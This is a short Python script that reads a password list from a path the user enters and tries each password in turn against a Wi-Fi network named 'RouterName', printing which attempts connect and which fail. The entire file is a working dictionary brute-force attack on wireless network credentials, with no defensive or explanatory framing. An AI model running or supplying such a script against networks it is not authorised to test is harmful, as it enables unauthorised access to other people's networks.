from wireless import Wireless

passwordlist = str(input('Enter the path to the password list: '))
wire = Wireless()
with open(passwordlist, 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid="RouterName",password=line.strip()):
            print(f'[+] successfully connected using {line}')
        else:
            print(f'[-] Failed to connected using {line}')
